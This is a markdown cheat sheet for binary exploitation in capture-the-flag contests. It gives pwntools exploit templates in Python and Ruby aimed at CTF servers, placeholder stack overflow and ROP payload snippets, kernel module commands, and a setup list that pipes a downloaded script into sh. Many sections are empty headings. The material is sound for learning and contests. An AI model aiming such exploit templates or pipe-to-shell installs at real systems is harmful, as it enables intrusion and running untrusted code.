# Native Application Exploitation aka Binary Exploitation aka Pwning
Command Line cheat sheet for binary exploitation

* [Templates](#templates)
* MacOS
* Linux
	* Stack overflow
	* Format string
	* Heap
	* FILE
	* Integer overflow
	* Race conditions
	* Kernel
	* ARM
* Windows
	* Stack
	* Kernel
* [Browser](browser.md)
* [Misc](#misc)

<h2 id="templates">Exploit template</h2>

<h4>Python</h4>
	
	#!/usr/bin/env python
	
	from pwn import *

	BINARY = './library_in_c'
	LIBC = './libc.so.6'
	HOST = 'shell.actf.co'
	PORT = 20201
	
	elf = ELF(BINARY)
	libc = ELF('./libc.so.6')

	context.terminal = ['tmux', 'split-w']
	
	printf = elf.got['printf']		

	def get_base_address(proc):
		return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

	def debug(breakpoints):
		script = ""
		for bp in breakpoints:
			script += "b *0x%x\n"%(PIE+bp)
		gdb.attach(process(BINARY), gdbscript=script)

	def start():
	    if not args.REMOTE:
		print "LOCAL PROCESS"
		return process(BINARY, env={"LD_PRELOAD":LIBC})
	    else:
		print "REMOTE PROCESS"
		return remote(HOST, PORT)


	p = start()
	if args.GDB:
	    gdb.attach(p, 'b main')

	p.interactive()


<h4>Ruby</h4>
	
	gem install pwntools
	
	require 'pwn'
	
	context.arch = 'i386'
	context.log_level = :debug
	z = Sock.new 'chall.pwnable.tw', 10000

	z.recvuntil "Let's start the CTF:"
	z.send p64(0x1337).rjust(0x18, 'A')
	
	z.interact

<h2 id="linux">Linux</h2>

<h3 id="stack">Stack Exploitation</h3>
	
<h4>Stack overflow</h4>

	buffer = 'A' * 1337
	rip = p64(0x1337) # Address of shellcode
	payload = "SHELLCODE"

	exploit = buffer + rip
	

<h4>Shellcode in bss section</h4>

	buffer = 'A' * 1337
	gets = elf.plt['gets']
	bss = elf.bss(0x20) # BSS at 0x20 bytes offset
	pop_rdi = p64(0x1337)

	payload = buffer + pop_rdi + bss + gets + bss

<h4>Ret2libc</h4>

<h4>ROP syscall</h4>
		
<h4>ROP</h4>

<h3>Format String</h3>

<h3>Heap</h3>

<h4>Off by one</h4>

<h4>Chunk extension/Overlapping</h4>

<h4>Unlink</h4>

<h4>Use After Free</h4>

<h4>Fastbin attack</h4>

<h4>Unsorted bin attack</h4>

<h4>Large bin attack</h4>

<h4>Tcache attacks</h4>

<h4>House of Einherjar</h4>

<h4>House of Force</h4>

<h4>House of Lore</h4>

<h4>House of Orange</h4>

<h4>House of Rabbit</h4>

<h4>House of Roman</h4>

<h3>FILE</h3>

<h3>Integers</h3>

<h3>Race Conditions</h3>

<h3>Kernel</h3>
	
	# List kernel modules
	lsmod
	
	# Insert LKM
	insmod <filename> param1=1 array_param=1,2
	modprobe <module>
	
	# Remove LKM
	rmmod <module> 
	rmmod -f <module> #Force remove
	modprobe -r <module>
	
	# Debugging symbols
	nm <module>

	# View printk output
	dmesg
	
	# View inode
	ls -i <file>
	stat <file>


<h2 id="misc">Misc</h2>

	# Debug Macho binaries (by mgrube)
	codesign --remove-signature app.app
	xattr -r -d app.app

	# Quick pwn setup

	apt update
	sudo apt install wget
	apt install --assume-yes gdb
	wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh
	apt install --assume-yes python
	apt install --assume-yes vim
	apt install --assume-yes python-pip
	apt install --assume-yes wget
	apt install --assume-yes net-tools
	apt install --assume-yes ruby
	apt install --assume-yes tmux
	pip install capstone
	pip install pwntools
	pip install ropgadget
	gem install one_gadget

	# gdb LD_PRELOAD 

	set exec-wrapper env 'LD_PRELOAD=./libc.so.6'
	set env LD_PRELOAD ./libc.so.6

	# Linux Dockers

	debian:latest
	pwndocker:latest
	glibc2.23-pwn:latest
	
	# When using old ubuntu versions

	gedit /etc/apt/sources.list
	deb http://old-releases.ubuntu.com/ubuntu karmic main restricted
	
